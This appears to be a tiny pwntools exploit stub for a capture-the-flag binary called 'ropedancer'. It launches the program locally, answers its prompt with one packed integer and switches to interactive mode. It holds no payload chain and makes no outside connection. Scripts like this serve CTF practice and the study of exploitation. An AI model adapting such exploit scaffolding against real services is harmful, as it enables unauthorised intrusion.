from pwn import *

io = process('./ropedancer')

io.recvuntil(b'ROPedancer? ')
io.send(p32(175334777))
io.interactive()